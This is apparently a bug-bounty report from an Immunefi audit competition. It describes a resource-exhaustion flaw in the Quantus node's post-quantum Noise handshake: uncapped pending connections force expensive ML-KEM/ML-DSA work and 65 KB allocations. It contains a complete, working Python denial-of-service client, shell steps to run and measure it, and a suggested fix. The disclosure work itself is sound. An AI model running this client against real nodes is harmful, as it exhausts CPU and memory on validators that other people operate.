# 88736 bc medium missing pending handshake admission cap in the quantus pq noise stack lets unauthenticated peers force ml kem ml dsa work and 65 kb allocations per connection increasing node res&#x20;

**Submitted on Aug 14th 2026 at 18:52:35 UTC by @Jornason for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88736
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

### Brief/Intro

Quantus validators expose the Litep2p TCP listener publicly by default. Every incoming connection negotiates `/noise` and immediately executes the Quantus post-quantum handshake preamble — an ML-KEM-768 key generation and an ML-DSA signature — before the peer sends a single handshake payload, and pending (not-yet-established) connections are not counted against the configured incoming-connection limit. A remote unauthenticated attacker with 28 bytes per connection can therefore force unlimited concurrent expensive PQ handshakes, and with two more bytes (`0xffff`) force a 65,535-byte allocation per pending connection. Measured on a real release `quantus-node` at the frozen commit, 512 stalled connections raised node RSS by 62–197% and node CPU from 0.11% to 13.5%; 4,096 connections added +506 MB RSS (+1285%) and 54% CPU — against \~3–12 KB/s of attacker traffic, which is not brute force. This matches the program's Medium impact: increasing network processing node resource consumption by at least 30% without brute force actions.

### Vulnerability Details

All references are to `audit-comp-quantus-chain` at commit `3b243b870a5442a6e5f443056f67bbba87d472f5` (the competition snapshot).

{% stepper %}
{% step %}

## The vulnerable path is Quantus's own post-quantum Noise rewrite (in scope)

Quantus vendored Litep2p and replaced its Noise handshake with a post-quantum pqXX variant (PR #574). In `client/litep2p/src/crypto/noise/mod.rs`, `NoiseContext::new()` generates an ML-KEM-768 keypair and builds the Clatter session, and `assemble()` signs the KEM public key with the node's ML-DSA identity key:

```rust
// client/litep2p/src/crypto/noise/mod.rs
pub fn new(keypair: &Keypair, role: Role) -> Result<Self, NegotiationError> {
    // Generate ML-KEM 768 keypair for Noise static key
    let kem_keypair = protocol::Keypair::new();          // ML-KEM-768 keygen
    ...
    let session = ClatterSession::new(&[], is_initiator, &kem_keypair)?;
    let context = Self::assemble(session, kem_keypair, keypair, role)?;  // ML-DSA sign
```

`negotiate_connection()` (`client/litep2p/src/transport/tcp/connection.rs`) calls `noise::handshake()` — which creates this context — immediately after multistream-select negotiates `/noise`, before reading the peer's first pqXX message. So a peer that sends only the 28-byte multistream-select negotiation (`0x13 "/multistream/1.0.0\n"` + `0x07 "/noise\n"`) has already cost the listener one ML-KEM-768 keygen, one ML-DSA signature, and one full NoiseContext. Upstream Litep2p performs only cheap x25519/ed25519 work at this point; the per-connection cost asymmetry exists only because of Quantus's PQ rewrite.
{% endstep %}

{% step %}

## Pending handshakes bypass the incoming-connection limit (amplification condition)

The validator configures `max_incoming_connections = 10_000` (`client/network/src/lib.rs`), applied in `client/network/src/litep2p/mod.rs`. But `ConnectionLimits::on_incoming()` (`client/litep2p/src/transport/manager/limits.rs`) checks only the established set:

```rust
pub fn on_incoming(&mut self) -> Result<(), ConnectionLimitsError> {
    if let Some(max_incoming_connections) = self.config.max_incoming_connections {
        if self.incoming_connections.len() >= max_incoming_connections {  // established only
            return Err(ConnectionLimitsError::MaxIncomingConnectionsExceeded);
        }
    }
    Ok(())
}
```

A connection is inserted into `incoming_connections` only after the full handshake completes. Stalled pre-auth handshakes therefore accumulate without bound; the 5-second production handshake timeout bounds how long each connection lives, not how fast new ones arrive. (Note: this limits behavior is inherited from upstream Litep2p v0.13.3; we describe it as the amplification condition. The root cause — the expensive pre-auth PQ work — is Quantus's own code, and the vulnerability is exploitable only because of that rewrite.)
{% endstep %}

{% step %}

## Two extra bytes force a 65,535-byte pre-read allocation

`read_handshake_message()` (`crypto/noise/mod.rs`) reads a 2-byte big-endian length, allocates that many zeroed bytes, and only then waits for the payload:

```rust
let mut size = BytesMut::zeroed(2);
io.read_exact(&mut size).await?;
let size = size.get_u16();
let mut message = BytesMut::zeroed(size as usize);   // allocated before payload arrives
io.read_exact(&mut message).await?;
```

A stalled peer that sends `0xffff` retains a 65,535-byte allocation per pending connection until timeout. Quantus additionally raised the follow-on `out` buffer for handshake messages from upstream's `+200` bytes to `+HANDSHAKE_BUFFER_SIZE` (16,384), further increasing per-connection memory.
{% endstep %}
{% endstepper %}

**Default-deployment reachability.** Litep2p is the default network backend (`client/network/src/config.rs`), validator listeners default to public wildcard addresses (`client/cli/src/params/network_params.rs`), and the production network builder applies the configuration above unchanged.

**Attacker preconditions:** reach the validator's public TCP port and complete the `/noise` multistream negotiation. No account, stake, fee, miner credential, valid pqXX message, or any protocol-valid payload is required.

### Impact Details

Selected impact (Medium): *Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours.*

Measured on a real release `quantus-node` binary (SHA-256 `64e6291d…f4960`) built from the frozen commit, running `--dev` in external-miner (idle) mode with a loopback listener; attack delivered by an external asyncio client speaking only the 28-byte `/noise` negotiation per connection:

| attack            | concurrency | node CPU (baseline → attack) | node RSS delta                                                                    | control                    |
| ----------------- | ----------: | ---------------------------- | --------------------------------------------------------------------------------- | -------------------------- |
| negotiate + stall |         512 | 0.11% → 13.53%               | —                                                                                 | raw-TCP control: 0.46% CPU |
| negotiate + stall |        2048 | 0.11% → 50.47%               | —                                                                                 | —                          |
| + `0xffff` prefix |         512 | 0.11% → 13.57%               | +42 to +71 MB (+62% to +197%)                                                     | raw-TCP control: +3.6% RSS |
| + `0xffff` prefix |        4096 | 0.12% → 54.20%               | +354 to +506 MB (+334% to +1285%), 4,099 pending connections held (lsof-verified) | —                          |

* Both runs at each scale were reproduced on separate days with fresh nodes; an independent verifier reproduced the same numbers (RSS +186.9%, CPU 13.1% at 512) and rated reproduction confidence HIGH.
* The held memory scales linearly with the *uncapped* pending population (\~80–130 KB per pending connection including the 65,535-byte frame and context buffers), so the +30% threshold is met at a few hundred connections and vastly exceeded at a few thousand, independent of the node's absolute baseline. After the attack stops, RSS does not return to baseline (allocator retains the pages); the elevation persists until process restart.
* The CPU path requires no allocation at all: every 28-byte negotiation triggers one ML-KEM-768 keygen and one ML-DSA signature. 512 stalled connections churn \~102 handshakes/second under the 5s timeout (18,432 handshakes in 182 s, 100% accepted, no rate-limit or refusal logged by the node).
* Component-level measurement (production Litep2p code, instrumented counters): 512 pending `/noise` connections retired 8.43–8.77 billion instructions vs 177 M (unsupported-protocol control) and 146 M (raw-TCP control) — a 47–60× amplification; 15,360 attacker bytes induced 33,553,920 bytes of declared allocations (2,184×).

**Not brute force:** total attacker bandwidth is \~3–12 KB/s and \~30 bytes per connection; the damage comes from the per-connection cost asymmetry introduced by the PQ handshake, not from traffic volume.

**Scope note:** no shutdown, transaction delay, chain split, or fund impact is claimed; the claim is exactly the Medium resource-consumption impact above.

### References

* `client/litep2p/src/crypto/noise/mod.rs` — `NoiseContext::new()`, `assemble()`, `read_handshake_message()` (commit `3b243b8`)
* `client/litep2p/src/transport/manager/limits.rs` — `ConnectionLimits::on_incoming()`
* `client/litep2p/src/transport/tcp/connection.rs` — `TcpConnection::negotiate_connection()`
* `client/network/src/config.rs`, `client/network/src/lib.rs`, `client/network/src/litep2p/mod.rs`, `client/cli/src/params/network_params.rs` — default backend, public listener, 10,000 established-incoming configuration
* PR #574 (Litep2p PQ vendoring) — provenance of the modified code

## Link to Proof of Concept

<https://gist.github.com/Jornason/8347783e68af6bc5d5d0d11b1ad4c6e6>

## Proof of Concept

Fully self-contained: no source modification, no patch — the attack is delivered by an external TCP client against a stock release node. Everything runs on loopback; no public network or project asset is contacted.

{% stepper %}
{% step %}

## Build the node

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain
cd audit-comp-quantus-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
cargo build --release --package quantus-node
```

Expected binary SHA-256 (aarch64-apple-darwin, rustc 1.93): `64e6291d4af5b89cd6fa8e128202c02ec03713fb549d8724ee91e3fa743f4960`.
{% endstep %}

{% step %}

## Start an idle local node (loopback only)

```bash
./target/release/quantus-node --dev --tmp \
  --miner-listen-port 19833 --rpc-port 19944 \
  --listen-addr /ip4/127.0.0.1/tcp/31555 --no-prometheus
```

`--miner-listen-port` makes the node wait for external miners instead of mining locally, giving a clean near-idle baseline (CPU ≈ 0.1%). Wait until port 31555 accepts TCP connections.
{% endstep %}

{% step %}

## Save the attack client as `h21_attack.py`

This is the complete attack. Per connection it sends only the 28-byte multistream-select `/noise` negotiation, then a 2-byte `0xffff` length prefix, then stalls. Workers reconnect when the server times out (5 s), keeping the pending-handshake population constant.

```python
#!/usr/bin/env python3
"""H21 node-level PoC: unauthenticated Litep2p /noise pre-auth amplification.
Loopback-only, against a local dev node. No valid pqXX payload is ever sent."""
import argparse, asyncio, json, time

HEADER = b"\x13/multistream/1.0.0\n"   # len("/multistream/1.0.0\n") = 19 = 0x13
NOISE = b"\x07/noise\n"                # len("/noise\n") = 7 = 0x07
FFFF = b"\xff\xff"                     # u16 max -> listener allocates 65,535 bytes

async def read_negotiation_reply(reader, timeout=5.0):
    data = b""
    try:
        while data.count(b"\n") < 2 and len(data) < 4096:
            chunk = await asyncio.wait_for(reader.read(256), timeout)
            if not chunk:
                break
            data += chunk
    except (asyncio.TimeoutError, ConnectionResetError, OSError):
        pass
    lines = [ln for ln in data.split(b"\n") if ln]
    return bool(lines) and lines[-1].endswith(b"/noise")

async def worker(host, port, mode, hold_until, stats):
    while time.monotonic() < hold_until:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=10.0)
        except (asyncio.TimeoutError, OSError):
            stats["connect_err"] += 1
            await asyncio.sleep(0.1)
            continue
        stats["connected"] += 1
        try:
            if mode in ("mem", "cpu"):
                writer.write(HEADER + NOISE)      # 28 bytes, total attacker input
                await writer.drain()
                if await read_negotiation_reply(reader):
                    stats["noise_accepted"] += 1
                if mode == "mem":
                    writer.write(FFFF)            # +2 bytes -> 65,535-byte allocation
                    await writer.drain()
                    stats["ffff_sent"] += 1
            # stall: hold the pending handshake open until the server closes it
            while time.monotonic() < hold_until:
                chunk = await asyncio.wait_for(reader.read(256), timeout=15.0)
                if not chunk:
                    break
        except (asyncio.TimeoutError, ConnectionResetError, BrokenPipeError, OSError):
            pass
        finally:
            stats["closed"] += 1
            try:
                writer.close()
                await writer.wait_closed()
            except OSError:
                pass

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--mode", choices=["mem", "cpu", "control-raw"], default="mem")
    ap.add_argument("--concurrency", type=int, default=512)
    ap.add_argument("--duration", type=float, default=180.0)
    args = ap.parse_args()
    stats = {"connected": 0, "noise_accepted": 0, "ffff_sent": 0,
             "closed": 0, "connect_err": 0}
    hold_until = time.monotonic() + args.duration
    t0 = time.time()
    await asyncio.gather(*[
        worker(args.host, args.port, args.mode, hold_until, stats)
        for _ in range(args.concurrency)])
    stats["wall_seconds"] = round(time.time() - t0, 2)
    print(json.dumps(stats, indent=2, sort_keys=True))

if __name__ == "__main__":
    asyncio.run(main())
```

{% endstep %}

{% step %}

## Measure the baseline (120 s)

In a second terminal, sample the node process once per second:

```bash
NODE_PID=$(pgrep -f 'quantus-node --dev')
( while kill -0 $NODE_PID 2>/dev/null; do
    echo "$(date +%s) $(ps -o rss=,time= -p $NODE_PID)"
    sleep 1
  done ) > samples.txt
```

Let it run alone for 120 s — this is the baseline window.
{% endstep %}

{% step %}

## Run the attack (180 s), keep sampling

```bash
python3 h21_attack.py --port 31555 --mode mem --concurrency 512 --duration 180
```

Expected attacker-side output: `"connected": ~18432`, `"noise_accepted": ~18432` (100% of negotiations accepted), `"ffff_sent": ~18432`. The node logs show no connection-limit or refusal lines; the node stays `Idle (0 peers)`.
{% endstep %}

{% step %}

## Expected results

Compare mean RSS of the last 60 baseline samples vs the middle 60 attack samples:

```bash
python3 - <<'EOF'
lines = [l.split() for l in open('samples.txt')]
# first 120 lines = baseline (1 sample/s), attack starts at line ~120
def rss_mb(rows): return sum(int(r[1]) for r in rows) / len(rows) * 1024 / 1e6
base = rss_mb(lines[60:120]); atk = rss_mb(lines[180:240])
print(f"baseline={base:.1f}MB attack={atk:.1f}MB delta={atk-base:+.1f}MB ({(atk-base)/base*100:+.1f}%)")
EOF
```

Measured on the competition commit (reproduced across four independent runs on two days, including one run by an independent verifier):

| concurrency | node CPU (baseline → attack) | node RSS delta                                                               | raw-TCP control       |
| ----------: | ---------------------------- | ---------------------------------------------------------------------------- | --------------------- |
|         512 | 0.11% → 13.5%                | +42 to +71 MB (**+62% to +197%**)                                            | +3.6% RSS / 0.46% CPU |
|        4096 | 0.12% → 54.2%                | +354 to +506 MB (**+334% to +1285%**), 4,099 pending connections held (lsof) | —                     |

* RSS does not return to baseline after the attack stops; the elevation persists until the node process restarts.
* Held memory scales linearly with the uncapped pending population (\~80–130 KB per pending connection), so the +30% threshold is independent of the node's absolute baseline.
* Control: `--mode control-raw` (connect and hold, send nothing) yields \~0.46% CPU and +3.6% RSS — the amplification comes from the `/noise` path, not from holding sockets.
* `--mode cpu` (omit the `0xffff` prefix) isolates the pure CPU path: every 28-byte negotiation forces one ML-KEM-768 keygen + one ML-DSA signature; \~102 handshakes/s churn at 512 stalled connections (5 s timeout).
  {% endstep %}

{% step %}

## Why this qualifies as "without brute force actions"

Total attacker bandwidth is \~3 KB/s (30 bytes per connection, \~100 connections/s at steady state). The resource increase comes entirely from the per-connection cost asymmetry of the Quantus PQ Noise preamble and the length-prefixed pre-read allocation, not from traffic volume.

Corroborating component-level evidence (instrumented counters on the production Litep2p code, available on request): 512 pending `/noise` connections retire 8.4–8.8 B instructions vs 177 M (unsupported-protocol control) and 146 M (raw-TCP control); 15,360 attacker bytes induce exactly 33,553,920 bytes of declared allocations.
{% endstep %}
{% endstepper %}

### Suggested fix

Reserve and cap pending inbound handshakes before protocol negotiation (release the reservation on every failure/timeout/close path, promote atomically to the established counter), and bound the Noise handshake frame length to the exact protocol maximum before allocation (or read into a small bounded buffer). A global pending cap is the load-bearing fix; per-IP token buckets are complementary.
